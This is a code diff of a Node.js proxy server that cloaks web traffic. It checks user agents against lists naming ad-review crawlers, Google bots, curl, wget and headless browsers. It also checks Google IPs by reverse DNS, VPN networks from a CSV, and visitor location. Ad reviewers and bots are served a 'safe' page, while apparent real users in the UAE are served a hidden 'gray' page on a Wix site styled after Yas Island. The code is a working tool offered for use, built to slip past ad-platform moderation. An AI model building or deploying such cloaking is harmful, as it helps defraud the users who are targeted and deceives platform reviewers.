@@ -6,17 +6,14 @@ const fs = require("fs");
 const csv = require("csv-parser");
 const requestIp = require("request-ip");
 
-// --- Configuration ---
 const PORT = process.env.PORT || 10000;
 const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
 const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";
 const UAE_COUNTRY_CODE = "AE";
 
-// --- Trust proxy for correct IP detection ---
 app.set("trust proxy", true);
 
-// --- Bot Keywords ---
-const BOT_KEYWORDS = [ /* كما هي بدون تغيير */ 
+const BOT_KEYWORDS = [
   "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
   "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
   "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse", "facebookexternalhit",
@@ -26,15 +23,13 @@ const BOT_KEYWORDS = [ /* كما هي بدون تغيير */
   "validator", "parser", "scraper"
 ];
 
-// --- Suspicious User-Agents ---
 const SUSPICIOUS_AGENTS = [
   "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
 ];
 
 // --- Load Blocked ASN List from CSV ---
 let blockedASNList = [];
-
-fs.createReadStream("vpn_asn_list.csv")
+fs.createReadStream("vpn_asn_full_list.csv")
   .pipe(csv())
   .on("data", (row) => {
     blockedASNList.push({
@@ -43,34 +38,27 @@ fs.createReadStream("vpn_asn_list.csv")
     });
   })
   .on("end", () => {
-    console.log(`✅ تم تحميل ${blockedASNList.length} من ASN المحظور`);
+    console.log(`✅ Loaded ${blockedASNList.length} ASN entries`);
   });
 
-// --- Check if ASN is blocked ---
 function isBlockedASN(asn, orgName) {
   if (!asn || !orgName) return false;
-
   const cleanASN = asn.trim().toUpperCase();
   const cleanOrg = orgName.toLowerCase();
-
   return blockedASNList.some(entry =>
     entry.asn === cleanASN || cleanOrg.includes(entry.orgName)
   );
 }
 
-// --- Bot Detection ---
 async function isBot(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const ip = req.clientIp || req.ip;
   if (BOT_KEYWORDS.some(bot => ua.includes(bot))) return true;
-
   const hasHeaders = req.headers["accept"] && req.headers["accept-language"] && req.headers["accept-encoding"];
   if (!hasHeaders) return true;
-
   return await isGoogleRelatedIP(ip);
 }
 
-// --- Check Google IP via DNS ---
 async function isGoogleRelatedIP(ip) {
   return new Promise(resolve => {
     if (!ip) return resolve(false);
@@ -83,7 +71,6 @@ async function isGoogleRelatedIP(ip) {
   });
 }
 
-// --- Check Real User ---
 function isLikelyRealUser(req) {
   const ua = (req.headers["user-agent"] || "").toLowerCase();
   const headers = req.headers;
@@ -100,22 +87,29 @@ function isLikelyRealUser(req) {
   );
 }
 
-// --- Proxy Content ---
+// ✅ FIXED Proxy Content (with safe fallback headers)
 async function proxyContent(targetUrl, req, res) {
   try {
-    const response = await axios({
+    const headersToForward = {
+      "User-Agent": req.headers["user-agent"] || "Mozilla/5.0",
+      "Accept": req.headers["accept"] || "*/*",
+      "Accept-Encoding": req.headers["accept-encoding"] || "gzip, deflate, br",
+      "Accept-Language": req.headers["accept-language"] || "en-US,en;q=0.9"
+    };
+
+    const axiosConfig = {
       method: req.method,
       url: targetUrl + req.url,
       responseType: "stream",
-      headers: {
-        "User-Agent": req.headers["user-agent"],
-        "Accept": req.headers["accept"],
-        "Accept-Encoding": req.headers["accept-encoding"],
-        "Accept-Language": req.headers["accept-language"],
-      },
-      data: req.body,
+      headers: headersToForward,
       validateStatus: () => true
-    });
+    };
+
+    if (["POST", "PUT", "PATCH"].includes(req.method)) {
+      axiosConfig.data = req.body;
+    }
+
+    const response = await axios(axiosConfig);
 
     for (const key in response.headers) {
       if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
@@ -126,7 +120,7 @@ async function proxyContent(targetUrl, req, res) {
     res.status(response.status);
     response.data.pipe(res);
   } catch (error) {
-    console.error(`❌ Proxy error:`, error.message);
+    console.error(`❌ Proxy error to ${targetUrl}:`, error.message);
     res.status(500).send("Internal Server Error");
   }
 }
@@ -136,7 +130,7 @@ app.use(requestIp.mw());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// --- Route Handler ---
+// --- Main Route Handler ---
 app.all("*", async (req, res) => {
   const ip = req.clientIp || req.ip || "no-ip";
   const ua = req.headers["user-agent"] || "no-agent";
@@ -159,7 +153,7 @@ app.all("*", async (req, res) => {
   const isRealUser = isLikelyRealUser(req);
   const isASNBlocked = isBlockedASN(asn, orgName);
 
-  console.log(`🧠 Decision: IP=${ip} | FromUAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked}`);
+  console.log(`🧠 Decision: UAE=${isFromUAE} | Bot=${isDetectedBot} | RealUser=${isRealUser} | ASNBlocked=${isASNBlocked}`);
 
   await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));
 
@@ -174,5 +168,7 @@ app.all("*", async (req, res) => {
 
 // --- Start Server ---
 app.listen(PORT, () => {
-  console.log(`🚀 Server started on port ${PORT}`);
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`GRAY_PAGE: ${GRAY_PAGE}`);
+  console.log(`SAFE_PAGE: ${SAFE_PAGE}`);
 });
